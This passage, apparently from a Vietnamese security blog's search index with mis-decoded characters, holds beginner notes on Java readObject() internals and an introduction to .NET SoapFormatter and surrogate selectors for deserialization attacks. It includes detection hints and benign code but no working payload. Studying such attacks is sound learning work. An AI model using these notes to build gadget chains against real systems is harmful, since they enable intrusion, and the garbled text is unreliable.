viá»‡c Ä‘á»c Ä‘á»‘i tÆ°á»£ng tiáº¿p theo. Äoáº¡n code nÃ y Ä‘áº£m báº£o ráº±ng cÃ¡c Ä‘á»‘i tÆ°á»£ng Ä‘á»c tá»« luá»“ng dá»¯ liá»‡u Ä‘áº§u vÃ o Ä‘Ãºng Ä‘á»‹nh dáº¡ng vÃ  Ä‘Æ°á»£c xá»­ lÃ½ má»™t cÃ¡ch an toÃ n. NÃ³ lÃ  má»™t pháº§n quan trá»ng cá»§a cÆ¡ cháº¿ Ä‘á»c vÃ  giáº£i mÃ£ Ä‘á»‘i tÆ°á»£ng trong Java.\nTiáº¿p tá»¥c chÆ°Æ¡ng trÃ¬nh, dÃ²ng lá»‡nh 1353 Ä‘Æ°á»£c thá»±c thi: Táº¡i Ä‘Ã¢y, ObjectInputStream#readOrdinaryObject() Ä‘Æ°á»£c gá»i ChÃº Ã½ dÃ²ng 1781 vÃ  1782. Táº¡i dÃ²ng 1781, hÃ m readClassDesc() Ä‘Æ°á»£c gá»i Ä‘á»ƒ tráº£ vá» má»™t descriptor, giÃ¡ trá»‹ lÆ°u vÃ o biáº¿n desc. Sau Ä‘Ã³, biáº¿n nÃ y sáº½ kiá»ƒm tra xem cÃ³ thá»ƒ deserialize khÃ´ng. Tiáº¿p sau Ä‘Ã³, táº¡i dÃ²ng lá»‡nh 1805-1809, hÃ m readSerialData(obj, desc) sáº½ Ä‘Æ°á»£c gá»i. Dá»… Ä‘oÃ¡n Ä‘Æ°á»£c, hÃ m nÃ y xá»­ lÃ½, chuyá»ƒn Ä‘á»•i tá»« bytestream sang object.\nTÃ´i Ä‘i vÃ o hÃ m readClassDesc() Ä‘á»ƒ xem thá»­ tháº¿ nÃ o:\nTá»›i Ä‘Ã¢y chÃºng ta sáº½ xuáº¥t hiá»‡n má»™t Ä‘Æ¡n vá»‹ kiáº¿n thÃºc má»›i lÃ : Proxy vÃ  nonProxy\n3.1 Proxy vs nonProxy Báº¥t ká»³ khi nÃ o lÃ m viá»‡c vá»›i Java Serialization, chÃºng ta sáº½ gáº·p hai khÃ¡i niá»‡m quan trá»ng lÃ  \u0026ldquo;proxy\u0026rdquo; vÃ  \u0026ldquo;non-proxy\u0026rdquo;. Trong ngá»¯ cáº£nh Serialization, chÃºng thÆ°á»ng Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ tham chiáº¿u Ä‘áº¿n cÃ¡ch mÃ  Ä‘á»‘i tÆ°á»£ng Ä‘Æ°á»£c serialized vÃ  deserialized.\nProxy Serialization: Khi chÃºng ta serialize má»™t object theo cÃ¡ch proxy serialization, Java Serialization sáº½ táº¡o má»™t Ä‘á»‘i tÆ°á»£ng proxy, Ä‘Æ°á»£c gá»i lÃ  \u0026ldquo;proxy class\u0026rdquo;, Ä‘á»ƒ thay tháº¿ cho Ä‘á»‘i tÆ°á»£ng gá»‘c. Proxy class chá»©a thÃ´ng tin cáº§n thiáº¿t Ä‘á»ƒ tÃ¡i táº¡o Ä‘á»‘i tÆ°á»£ng ban Ä‘áº§u sau khi deserialization. Proxy class cÅ©ng Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ xÃ¡c Ä‘á»‹nh tráº¡ng thÃ¡i cá»§a Ä‘á»‘i tÆ°á»£ng vÃ  Ä‘á»ƒ xá»­ lÃ½ quyá»n truy cáº­p vÃ o trÆ°á»ng dá»¯ liá»‡u cá»§a Ä‘á»‘i tÆ°á»£ng.\nViá»‡c sá»­ dá»¥ng proxy serialization cÃ³ thá»ƒ há»¯u Ã­ch trong má»™t sá»‘ tÃ¬nh huá»‘ng. VÃ­ dá»¥, náº¿u má»™t Ä‘á»‘i tÆ°á»£ng chá»©a cÃ¡c trÆ°á»ng dá»¯ liá»‡u private, báº¡n cÃ³ thá»ƒ sá»­ dá»¥ng proxy serialization Ä‘á»ƒ Ä‘áº£m báº£o ráº±ng chá»‰ cÃ¡c thÃ nh pháº§n bÃªn trong Ä‘á»‘i tÆ°á»£ng cÃ³ thá»ƒ truy cáº­p vÃ  sá»­a Ä‘á»•i dá»¯ liá»‡u.\nNon-Proxy Serialization: NgÆ°á»£c láº¡i, khi serialization má»™t Ä‘á»‘i tÆ°á»£ng theo cÃ¡ch non-proxy serialization, Java Serialization sáº½ serialize toÃ n bá»™ Ä‘á»‘i tÆ°á»£ng, bao gá»“m cáº£ dá»¯ liá»‡u vÃ  tráº¡ng thÃ¡i cá»§a nÃ³. Khi deserialization, Ä‘á»‘i tÆ°á»£ng Ä‘Æ°á»£c tÃ¡i táº¡o chÃ­nh xÃ¡c theo tráº¡ng thÃ¡i ban Ä‘áº§u vÃ  khÃ´ng cáº§n sá»­ dá»¥ng proxy class.\nViá»‡c sá»­ dá»¥ng non-proxy serialization thÃ­ch há»£p trong nhá»¯ng trÆ°á»ng há»£p Ä‘Æ¡n giáº£n, khi khÃ´ng cÃ³ yÃªu cáº§u Ä‘áº·c biá»‡t vá» viá»‡c kiá»ƒm soÃ¡t truy cáº­p hoáº·c xá»­ lÃ½ tráº¡ng thÃ¡i cá»§a Ä‘á»‘i tÆ°á»£ng.\nTrong cáº£ hai trÆ°á»ng há»£p, proxy vÃ  non-proxy serialization Ä‘á»u cung cáº¥p kháº£ nÄƒng serialize vÃ  deserialization cÃ¡c Ä‘á»‘i tÆ°á»£ng Java. Tuy nhiÃªn, viá»‡c chá»n giá»¯a hai phÆ°Æ¡ng phÃ¡p nÃ y phá»¥ thuá»™c vÃ o yÃªu cáº§u vÃ  má»¥c Ä‘Ã­ch sá»­ dá»¥ng cá»§a báº¡n trong viá»‡c lÆ°u trá»¯ vÃ  khÃ´i phá»¥c dá»¯ liá»‡u Ä‘á»‘i tÆ°á»£ng.\nTiáº¿p tá»¥c vá»›i chÆ°Æ¡ng trÃ¬nh,\nHÃ m readNonProxyDesc() sáº½ Ä‘Æ°á»£c gá»i,\nTrong ObjectInputStream#readNonProxyDesc(), táº¡i dÃ²ng 1609, hÃ m readClassDescriptor() tráº£ vá» nativeReadObject.User, lÆ°u vÃ o biáº¿n readDesc.\nTáº¡i dÃ²ng 1620, resolveClass() Ä‘Æ°á»£c gá»i Ä‘á»ƒ phÃ¢n giáº£i readDesc, lÆ°u vÃ o biáº¿n cl.\nÄáº¿n dÃ²ng 1630, chÆ°Æ¡ng trÃ¬nh sáº½ initNonProxy vá»›i cÃ¡c tham sá»‘ readDesc, cl, resolveEx, readClassDesc(false)\nSau Ä‘Ã³, desc sáº½ Ä‘Æ°á»£c return á»Ÿ dÃ²ng 1634.\nTiáº¿p tá»¥c vá»›i chÆ°Æ¡ng trÃ¬nh ObjectInputStream#readOrdinaryObject. Sau khi cÃ³ Ä‘Æ°á»£c class descriptor trong biáº¿n desc, chÆ°Æ¡ng trÃ¬nh sáº½ tiáº¿p tá»¥c thá»±c thi. á» dÃ¢y, ta chÃº Ã½ biáº¿n obj Ä‘Æ°á»£c táº¡o má»›i thÃ´ng qua desc.newInstance().Sau Ä‘Ã³ truyá»n vÃ o hÃ m readSerialData(obj, desc)\nHÃ m readSerialData\nDÃ²ng 1899 kiá»ƒm tra xem readObject() cÃ³ bá»‹ overwrite hay khÃ´ng. Náº¿u cÃ³ khá»‘i lá»‡nh 1900-1940 Ä‘Æ°á»£c gá»i. Náº¿u khÃ´ng, hÃ m defaultReadFields() Ä‘Æ°á»£c gá»i.\nÄiá»u nÃ y giáº£i thÃ­ch táº¡i sao khi chÃºng ta thÃªm hÃ m private readObject() á»Ÿ vÃ­ dá»¥ Ä‘áº§u thÃ¬ output tráº£ vá» láº¡i khÃ¡c.\nVÃ¬ chÃºng ta Ä‘ang debug vá»›i ngá»¯ cáº£nh cÃ³ overwrite, nÃªn\nhÃ m slotDesc.invokeReadObject Ä‘Æ°á»£c gá»i, vá»›i object cÃ³ name=null vÃ  age = 0\nHÃ m invokeReadObject() sáº½ gá»i readObjectMethod.invoke() Tá»›i Ä‘Ã¢y chÆ°Æ¡ng trÃ¬nh sáº½ gá»i tá»›i Method#invoke() Method#invoke()\nÄÃ¢y lÃ  1 Reflection API cho phÃ©p giÃ¡n tiáº¿p invoke 1 method, Reflection API nÃ y sinh ra Ä‘á»ƒ invoke method cá»§a 1 object khÃ´ng thá»ƒ cast Ä‘Æ°á»£c vÃ o 1 kiá»ƒu xÃ¡c Ä‘á»‹nh nÃ o Ä‘Ã³, VÃ­ dá»¥: TrÆ°á»ng há»£p thÃ´ng thÆ°á»ng, ta cÃ³ thá»ƒ khai bÃ¡o HashMap obj = new HashMap(); vÃ  sau Ä‘Ã³ cÃ³ thá»ƒ gá»i obj.put(), obj.get() bÃ¬nh thÆ°á»ng mÃ  khÃ´ng cÃ³ váº¥n Ä‘á» gÃ¬ xáº£y ra. NhÆ°ng trong trÆ°á»ng há»£p thá»±c táº¿, cÃ³ 1 private class XYZ vÃ  public method foo(), tá»« má»™t nÆ¡i nÃ o Ä‘Ã³, nháº­n Ä‘Æ°á»£c 1 (Object)object cá»§a class XYZ nÃ y. Äá»ƒ invoke Ä‘Æ°á»£c method XYZ.foo() nÃ y, khÃ´ng thá»ƒ gá»i object.foo(), mÃ  pháº£i cast nÃ³ sang XYZ -\u0026gt; ((XYZ) object).foo() má»›i cÃ³ thá»ƒ call Ä‘Æ°á»£c. Váº¥n Ä‘á» á»Ÿ Ä‘Ã¢y lÃ  class XYZ Ä‘Æ°á»£c set á»Ÿ private, nÃªn tá»« bÃªn ngoÃ i khÃ´ng thá»ƒ access Ä‘Æ°á»£c class XYZ nÃ y, vÃ  cast (XYZ) object Ä‘Æ°á»£c. VÃ  method reflection sinh ra Ä‘á»ƒ giáº£i quyáº¿t váº¥n Ä‘á» nÃ y,\nTheo flow cá»§a method, ma.invoke() Ä‘Æ°á»£c gá»i vá»›i ma lÃ  DelegatingMethodAccessorImpl. NÃªn DelegatingMethodAccessorImpl#invoke() Ä‘Æ°á»£c gá»i\nHÃ m invoke nÃ y sáº½ gá»i qua NativeMethodAccessorImpl#invoke()\nVÃ  tá»›i hÃ m NativeMethodAccessorImpl#invoke(), hÃ m invoke0() Ä‘Æ°á»£c gá»i vá»›i 2 biáº¿n var1 lÃ  Object User vÃ  var2 lÃ  readObject method cá»§a chÃºng ta.\nVÃ  tá»›i Ä‘Ã¢y nÃ³ flow sáº½ nháº£y vá» method readObject cá»§a chÃºng ta vÃ  popup lÃªn 1 calc\nyeah, tá»›i Ä‘Ã¢y chÃºng ta Ä‘Ã£ Ä‘i háº¿t flow cá»§a native readObject(). TÃ´i tá»•ng há»£p flow náº±m á»Ÿ sÆ¡ Ä‘á»“ sau:\nTrong sÆ¡ Ä‘á»“ trÃªn, tÃ´i tháº¥y chÃºng ta cáº§n hiá»ƒu rÃµ hÃ m ObjectInputStream#readOrdinaryObject vÃ  Method#invoke vÃ¬ 2 method nÃ y sáº½ Ä‘iá»u hÆ°á»›ng luá»“ng thá»±c thi (khi chÃºng ta build payload chain)\nIV. Tá»•ng káº¿t NhÆ° Ä‘Ã£ Ä‘á» cáº­p á»Ÿ pháº§n Ä‘áº§u, series nÃ y lÃ  cá»§a ngÆ°á»i báº¯t Ä‘áº§u nÃªn cÃ¡c Ä‘Æ¡n vá»‹ kiáº¿n thá»©c Ä‘á»u lÃ  basic vÃ  blog nÃ y tÃ´i Ä‘á» cáº­p tá»›i Ä‘Æ¡n vá»‹ kiáº¿n thá»©c cÆ¡ báº£n cá»§a cÆ¡ báº£n: flow cá»§a readObject() Má»™t lÆ°u Ã½ á»Ÿ Ä‘Ã¢y, Ä‘á»ƒ detect java serialize, chÃºng ta cÃ³ thá»ƒ thá»±c hiá»‡n cÃ¡c cÃ¡ch sau: Java serialize object streams luÃ´n báº¯t Ä‘áº§u vá»›i: Magic bytes: 0xAC 0XED trong HEX, r00ABX trong Base64-encoded Header HTTP response: Content type: application/x-javaj-serialized-object Bruteforce the input: Ysoserial by Chris Frohoff Kiá»ƒm tra cÃ¡c third-party product. Káº¿t thÃºc pháº§n nÃ y, chÃºng ta sáº½ cÃ³ Ä‘á»§ kiáº¿n thá»©c cÆ¡ báº£n Ä‘á»ƒ tiáº¿n hÃ nh nghiÃªn cá»©u ApacheCommonsCollection. V. Nguá»“n tham kháº£o https://www.cnblogs.com/nice0e3/p/14127885.html https://www.vuln.cn/6296 https://portswigger.net/web-security/deserialization#:~:text=Insecure%20deserialization%20is%20when%20user,of%20an%20entirely%20different%20class ","description":"Sau hÆ¡n 2 thÃ¡ng há»c vá» PHP deserilazation, tÃ´i Ä‘Ã£ chuyá»ƒn qua há»c Java deserialization vá»›i tham vá»ng sáº½ rÃ¨n má»™t loáº¡i lá»—i Insecure deserialization trÃªn cÃ¡c ngÃ´n ngá»¯ PHP, JAVA, .Net ğŸ¤­ğŸ¤­ğŸ¤­ğŸ¤­ğŸ¤­.  VÃ¬ lÃ  má»™t Java deserialize fan thÃ¡ng 8 nÃªn má»i thá»© báº¯t Ä‘áº§u háº§u nhÆ° lÃ  sá»‘ 0. VÃ  phÆ°Æ¡ng phÃ¡p tiáº¿p cáº­n á»Ÿ Ä‘Ã¢y sáº½ lÃ  Ä‘i tá»« Ä‘Æ¡n giáº£n Ä‘áº¿n nÃ¢ng cao thÃ´ng qua rÃ¨n luyá»‡n nhiá»u hÆ¡n lÃ  Ä‘á»c lÃ½ thuyáº¿t. ","id":3,"section":"posts","tags":["java"],"title":"Khi newbie há»c Java deserialization attack: readObject() native","uri":"https://minhlongmt183.github.io/posts/khi_newbie_hoc_java_deserialization_attack_readobject/"},{"content":"[.NET 101] SoapFormatter:ActivitySurrogateSelector Sau gáº§n má»™t thÃ¡ng há»c vá» JavaDeserialize: há»c cÃ¡c khÃ¡i niá»‡m basic, reproduce cÃ¡c commonscollection thÃ¬ láº§n nÃ y tÃ´i cÃ³ cÆ¡ há»™i tiáº¿p xÃºc vá»›i .Net deserialize. Ná»™i dung cho newbie lÃ  há»c cÃ¡c kiáº¿n thá»©c basic vÃ  reproduce cÃ¡c chain kinh Ä‘iá»ƒn cá»§a .Net deserialize trÃªn å…ˆçŸ¥ç¤¾åŒº (aliyun.com)\nKhá»Ÿi Ä‘áº§u khÃ¡ thuáº­n lá»£i vá»›i cÃ¡c bÃ i:\ndotnet serialize 101 .net deserialization of BinaryFormatter .net deserialized by XmlSerializer NhÃ¬n chung lÃ  vÃ¬ cÃ³ kiáº¿n thá»©c cÆ¡ báº£n tá»« PHP deserialize vÃ  Java deserialize nÃªn á»Ÿ má»©c Ä‘á»™ 101 nÃ y khÃ´ng quÃ¡ khÃ³ vá»›i tÃ´i.\nNhÆ°ng Ä‘á»i khÃ´ng nhÆ° mÆ¡, Ä‘áº¿n vá»›i SoapFormatter:ActivitySurrogateSelector tÃ´i Ä‘á»c vÃ  lÃ m trong 3 ngÃ y vÃ  váº«n khÃ´ng hiá»ƒu Ä‘Æ°á»£c gÃ¬ ğŸ˜¥ğŸ˜¥ğŸ˜¥ğŸ˜¥. Do Ä‘Ã³, tÃ´i quyáº¿t Ä‘á»‹nh viáº¿t láº¡i tá»«ng bÆ°á»›c, tá»«ng cÃ¢u há»i vÃ  tá»± tÃ¬m hiá»ƒu, tráº£ lá»i. ÄÃ¢y lÃ  má»™t trong nhá»¯ng phÆ°Æ¡ng phÃ¡p há»c cá»§a tÃ´i: Ghi ra nhá»¯ng Ä‘iá»u mÃ¬nh khÃ´ng hiá»ƒu vÃ  tÃ¬m cÃ¡ch giáº£i quyáº¿t tá»«ng bÆ°á»›c má»™t.\nVÃ¬ lÃ  má»™t con gÃ  má»›i tiáº¿p xÃºc vá»›i .Net deserialize chÆ°a tá»›i 2 tuáº§n, nÃªn ná»™i dung bÃ i blog nÃ y khÃ¡ dÃ i vÃ  nhá»¯ng kiáº¿n thá»©c cÆ¡ báº£n khÃ¡ nhiá»u (khÃ´ng giÃ nh cho cÃ¡c profesional).\nNote:\nÄá»ƒ hiá»ƒu Ä‘Æ°á»£c chain exploit nÃ y, ta cáº§n cÃ³ má»™t sá»‘ kiáº¿n thá»©c cÆ¡ báº£n nháº¥t Ä‘á»‹nh mÃ  tÃ´i sáº½ trÃ¬nh bÃ y á»Ÿ pháº§n I,II,III, IV.\nI SoapFormatter SoapFormatter tÆ°Æ¡ng tá»± vá»›i XmlSerializer, Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ táº¡o xml-based soap data streams. Namespace náº±m á»Ÿ: System.Runtime.Serialization.Formatters.Soap Assembly á»Ÿ: System.Runtime.Serialization.Formatters.Soap.dll SoapFormatter cÃ³ thá»ƒ serialize vÃ  deserialize toÃ n bá»™ má»™t Ä‘á»“ thá»‹ cÃ¡c object (graph of objects) hoáº·c cÃ¡c objects káº¿t ná»‘i vá»›i nhau dÆ°á»›i Ä‘á»‹nh dáº¡ng SOAP. SoapFormatter implements IRemotingFormatter, IFormatter interfaces. Sá»± khÃ¡c biá»‡t giá»¯a SoapFormatter vÃ  BinaryFormatter lÃ  SoapFormatter khÃ´ng thá»ƒ serialize má»™t generic type trong khi BinaryFormatter khÃ´ng cáº§n chá»‰ rÃµ type cá»§a serialized object trong quÃ¡ trÃ¬nh deserialize. Trong bÃ i nÃ y tÃ´i sá»­ dá»¥ng Visual Studio 2019, lÃ­ do vÃ¬ phiÃªn báº£n nÃ y há»— trá»£ 1 extension GoToDnSpy. II .NET Objects vÃ  SOAP Streams ChÃºng ta báº¯t Ä‘áº§u vá»›i Ä‘oáº¡n code sau: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 using System; using System.IO; using System.Runtime.Serialization.Formatters.Soap; using System.Text; namespace SoapDeserialization { [Serializable] class Person { private int age; private string name; public int Age { get =\u0026gt; age; set =\u0026gt; age = value; } public string Name { get =\u0026gt; name; set =\u0026gt; name = value; } public void SayHello() { Console.WriteLine(\u0026#34;hello from SayHello\u0026#34;); } } class Program { static void Main(string[] args) { SoapFormatter soapFormatter = new SoapFormatter(); Person person = new Person(); person.Age = 18; person.Name = \u0026#34;Edisc\u0026#34;; using (MemoryStream stream = new MemoryStream()) { // serialize soapFormatter.Serialize(stream, person); string soap = Encoding.UTF8.GetString(stream.ToArray()); Console.WriteLine(soap); Console.WriteLine(\u0026#34;========================================\u0026#34;); // deserialize stream.Position = 0; Person p = (Person)soapFormatter.Deserialize(stream); Console.WriteLine(p.Name); Console.WriteLine(p.Age); p.SayHello(); } Console.ReadKey(); } } } Khi má»›i cháº¡y kháº£ nÄƒng sáº½ bá»‹ thiáº¿u thÆ° viá»‡n System.Runtime.Serialization.Formatters.Soap.dll nÃªn chÆ°Æ¡ng trÃ¬nh khÃ´ng thá»ƒ thá»±c thi Äá»ƒ fix lá»—i nÃ y, chÃºng ta cáº§n tÃ¬m Ä‘áº¿n Ä‘á»‹a chá»‰ lÆ°u trá»¯ System.Runtime.Serialization.Formatters.Soap.dll rá»“i import thÆ° viá»‡n nÃ y vÃ o references. Má»™t tip á»Ÿ Ä‘Ã¢y lÃ  tÃ¬m cÃ¡c dll báº±ng cÃ¡ch search trÃªn á»• C, sau Ä‘Ã³ import reference táº¡i Ä‘á»‹a chá»‰ Ä‘Ã³. CÃ²n cÃ¡ch import thÃ¬ tÃ´i Ä‘Ã£ nÃ³i trong bÃ i trÆ°á»›c.\nOutput nhÆ° sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;SOAP-ENV:Envelope xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:xsd=\u0026#34;http://www.w3.org/2001/XMLSchema\u0026#34; xmlns:SOAP-ENC=\u0026#34;http://schemas.xmlsoap.org/soap/encoding/\u0026#34; xmlns:SOAP-ENV=\u0026#34;http://schemas.xmlsoap.org/soap/envelope/\u0026#34; xmlns:clr=\u0026#34;http://schemas.microsoft.com/soap/encoding/clr/1.0\u0026#34; SOAP-ENV:encodingStyle=\u0026#34;http://schemas.xmlsoap.org/soap/encoding/\u0026#34;\u0026gt; \u0026lt;SOAP-ENV:Body\u0026gt; \u0026lt;a1:Person id=\u0026#34;ref-1\u0026#34; xmlns:a1=\u0026#34;http://schemas.microsoft.com/clr/nsassem/SoapDeserialization/ActivitySurrogateSelectorChain%2C%20Version%3D1.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3Dnull\u0026#34;\u0026gt; \u0026lt;age\u0026gt;18\u0026lt;/age\u0026gt; \u0026lt;name id=\u0026#34;ref-3\u0026#34;\u0026gt;Edisc\u0026lt;/name\u0026gt; \u0026lt;/a1:Person\u0026gt; \u0026lt;/SOAP-ENV:Body\u0026gt; \u0026lt;/SOAP-ENV:Envelope\u0026gt; ======================================== Edisc 18 hello from SayHello SOAP (Simple Object Access Protocol) lÃ  má»™t giao thá»©c truyá»n thÃ´ng Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ trao Ä‘á»•i thÃ´ng tin giá»¯a cÃ¡c á»©ng dá»¥ng qua máº¡ng. Trong SOAP, namespace (khÃ´ng gian tÃªn) Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ giá»›i háº¡n pháº¡m vi cá»§a cÃ¡c pháº§n tá»­ trong tin nháº¯n SOAP.\nSOAP sá»­ dá»¥ng khÃ´ng gian tÃªn (namespace) theo chuáº©n xmlns Ä‘á»ƒ giá»›i háº¡n pháº¡m vi namespace, vÃ  Ä‘iá»u nÃ y Ä‘Æ°á»£c pháº£n Ã¡nh trong tháº» a1.\nTrong output trÃªn, ta tháº¥y ráº±ng cÃ¡c pháº§n tá»­ trong SOAP-ENV:Envelope Ä‘Æ°á»£c liÃªn káº¿t vá»›i cÃ¡c namespace thÃ´ng qua cÃ¡c thuá»™c tÃ­nh xmlns. VÃ­ dá»¥:\nPháº§n tá»­ \u0026lt;SOAP-ENV:Envelope\u0026gt; Ä‘Æ°á»£c liÃªn káº¿t vá»›i namespace \u0026quot;http://schemas.xmlsoap.org/soap/envelope/\u0026quot; thÃ´ng qua thuá»™c tÃ­nh xmlns:SOAP-ENV. Pháº§n tá»­ \u0026lt;a1:Person\u0026gt; Ä‘Æ°á»£c liÃªn káº¿t vá»›i namespace \u0026quot;http://schemas.microsoft.com/clr/nsassem/SoapDeserialization/SoapDeserialization%2C%20Version%3D1.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3Dnull\u0026quot; thÃ´ng qua thuá»™c tÃ­nh xmlns:a1. NhÆ° váº­y, viá»‡c sá»­ dá»¥ng khÃ´ng gian tÃªn XML (namespace) giÃºp háº¡n cháº¿ pháº¡m vi cá»§a cÃ¡c pháº§n tá»­ trong tin nháº¯n SOAP vÃ  thÃ´ng tin vá» namespace nÃ y Ä‘Æ°á»£c pháº£n Ã¡nh trong tháº» a1.\nÄiá»u nÃ y quan trá»ng vÃ¬ náº¿u khÃ´ng cÃ³ viá»‡c giá»›i háº¡n namespace, cÃ¡c pháº§n tá»­ cÃ³ thá»ƒ xáº£y ra xung Ä‘á»™t hoáº·c khÃ´ng rÃµ rÃ ng trong viá»‡c xÃ¡c Ä‘á»‹nh pháº¡m vi vÃ  Ã½ nghÄ©a cá»§a chÃºng. Nhá» vÃ o viá»‡c sá»­ dá»¥ng khÃ´ng gian tÃªn, ta cÃ³ thá»ƒ Ä‘á»‹nh rÃµ vÃ  xÃ¡c Ä‘á»‹nh cÃ¡c pháº§n tá»­ trong tin nháº¯n SOAP theo cÃ¡c namespace cá»¥ thá»ƒ.\nNgoÃ i ra, SoapFormatter cÃ²n implement 2 interfaces: IRemotingFormatter, IFormatter. IFormatter\nIFormatter cÃ²n cÃ³ má»™t proxy selector\nproxy selector lÃ  gÃ¬?\nTrong quÃ¡ trÃ¬nh deserialize (chuyá»ƒn Ä‘á»•i tá»« dá»¯ liá»‡u Ä‘Ã£ Ä‘Æ°á»£c serialize thÃ nh Ä‘á»‘i tÆ°á»£ng) cá»§a .NET, \u0026ldquo;proxy selector\u0026rdquo; (bá»™ chá»n proxy) lÃ  má»™t khÃ¡i niá»‡m Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ xÃ¡c Ä‘á»‹nh cÃ¡ch thá»©c chá»n loáº¡i Ä‘á»‘i tÆ°á»£ng Ä‘Ã­ch Ä‘á»ƒ thá»±c hiá»‡n quÃ¡ trÃ¬nh deserialize.\nKhi ta thá»±c hiá»‡n quÃ¡ trÃ¬nh deserialize, .NET cáº§n biáº¿t cÃ¡ch chá»n vÃ  xÃ¢y dá»±ng Ä‘Ãºng loáº¡i Ä‘á»‘i tÆ°á»£ng mÃ  dá»¯ liá»‡u serialized sáº½ Ä‘Æ°á»£c chuyá»ƒn Ä‘á»•i thÃ nh. ÄÃ³ lÃ  lÃºc \u0026ldquo;proxy selector\u0026rdquo; (bá»™ chá»n proxy) Ä‘áº¿n. Proxy selector Ä‘á»‹nh nghÄ©a cÃ¡ch thá»©c chá»n Ä‘Ãºng loáº¡i Ä‘á»‘i tÆ°á»£ng tÆ°Æ¡ng á»©ng vá»›i dá»¯ liá»‡u Ä‘Ã£ Ä‘Æ°á»£c serialize.\nProxy selector cÃ³ thá»ƒ Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ tÃ¹y chá»‰nh quÃ¡ trÃ¬nh deserialize báº±ng cÃ¡ch xÃ¡c Ä‘á»‹nh bá»™ chá»n proxy tÃ¹y chá»‰nh. Bá»™ chá»n proxy tÃ¹y chá»‰nh nÃ y sáº½ quyáº¿t Ä‘á»‹nh loáº¡i Ä‘á»‘i tÆ°á»£ng cáº§n Ä‘Æ°á»£c xÃ¢y dá»±ng vÃ  sá»­ dá»¥ng trong quÃ¡ trÃ¬nh deserialize dá»±a trÃªn dá»¯ liá»‡u serialized vÃ  cÃ¡c quy táº¯c xÃ¡c Ä‘á»‹nh sáºµn.\nProxy selector giÃºp .NET xÃ¡c Ä‘á»‹nh loáº¡i Ä‘á»‘i tÆ°á»£ng cá»¥ thá»ƒ Ä‘á»ƒ khÃ´i phá»¥c dá»¯ liá»‡u serialized thÃ nh Ä‘á»‘i tÆ°á»£ng thÃ­ch há»£p. NÃ³ Ä‘Ã³ng vai trÃ² quan trá»ng trong viá»‡c Ä‘áº£m báº£o quÃ¡ trÃ¬nh deserialize diá»…n ra Ä‘Ãºng cÃ¡ch vÃ  dá»¯ liá»‡u Ä‘Æ°á»£c chuyá»ƒn Ä‘á»•i thÃ nh Ä‘á»‘i tÆ°á»£ng Ä‘Ãºng.\nÄá»ƒ xem Ä‘Æ°á»£c code nhÆ° trÃªn, ta dÃ¹ng dnSpy 64bit\nTIP: ChÃºng ta cÃ³ thá»ƒ dÃ¹ng extension GoToDnSpy (dÃ¹ng cho VS2019 trá»Ÿ Ä‘i) thÃ¬ quÃ¡ trÃ¬nh trace code sáº½ Ä‘Æ¡n giáº£n hÆ¡n nhiá»u\nHÃ£y sá»­a Ä‘á»•i Ä‘oáº¡n code ban Ä‘áº§u cá»§a chÃºng ta má»™t chÃºt :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 using System; using System.IO; using System.Runtime.Serialization; using System.Runtime.Serialization.Formatters.Soap; using System.Text; namespace SoapDeserialization { [Serializable] class Person { private int age; private string name; public int Age { get =\u0026gt; age; set =\u0026gt; age = value; } public string Name { get =\u0026gt; name; set =\u0026gt; name = value; } public void SayHello() { Console.WriteLine(\u0026#34;hello from SayHello\u0026#34;); } } //===================================begin new code =================================== sealed class PersonSerializeSurrogate : ISerializationSurrogate { public void GetObjectData(object obj, SerializationInfo info, StreamingContext context) { var p = (Person)obj; info.AddValue(\u0026#34;Name\u0026#34;, p.Name); } public object SetObjectData(object obj, SerializationInfo info, StreamingContext context, ISurrogateSelector selector) { var p = (Person)obj; p.Name = info.GetString(\u0026#34;Name\u0026#34;); return p; } } //===================================end new code =================================== class Program { static void Main(string[] args) { SoapFormatter soapFormatter = new SoapFormatter(); //=================================== begin new code =================================== var ss = new SurrogateSelector(); ss.AddSurrogate(typeof(Person), new StreamingContext(StreamingContextStates.All), new PersonSerializeSurrogate()); soapFormatter.SurrogateSelector = ss; //===================================end new code =================================== Person person = new Person(); person.Age = 18; person.Name = \u0026#34;Edisc\u0026#34;; using (MemoryStream stream = new MemoryStream()) { // serialize soapFormatter.Serialize(stream, person); string soap = Encoding.UTF8.GetString(stream.ToArray()); Console.WriteLine(soap); Console.WriteLine(\u0026#34;========================================\u0026#34;); // deserialize stream.Position = 0; Person p = (Person)soapFormatter.Deserialize(stream); Console.WriteLine(p.Name); Console.WriteLine(p.Age); p.SayHello(); } Console.ReadKey(); } } } Káº¿t quáº£ chÆ°Æ¡ng trÃ¬nh sau khi cháº¡y: Surrogate lÃ  gÃ¬?\nTrong C#, Surrogate (Ä‘áº¡i diá»‡n) lÃ  má»™t khÃ¡i niá»‡m liÃªn quan Ä‘áº¿n quÃ¡ trÃ¬nh tuáº§n tá»± hÃ³a (serialization) vÃ  phá»¥c há»“i (deserialization) Ä‘á»‘i tÆ°á»£ng.\nKhi má»™t Ä‘á»‘i tÆ°á»£ng Ä‘Æ°á»£c tuáº§n tá»± hÃ³a hoáº·c phá»¥c há»“i, Surrogate Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ Ä‘áº¡i diá»‡n cho Ä‘á»‘i tÆ°á»£ng gá»‘c vÃ  Ä‘iá»u khiá»ƒn quÃ¡ trÃ¬nh tuáº§n tá»± hÃ³a vÃ  phá»¥c 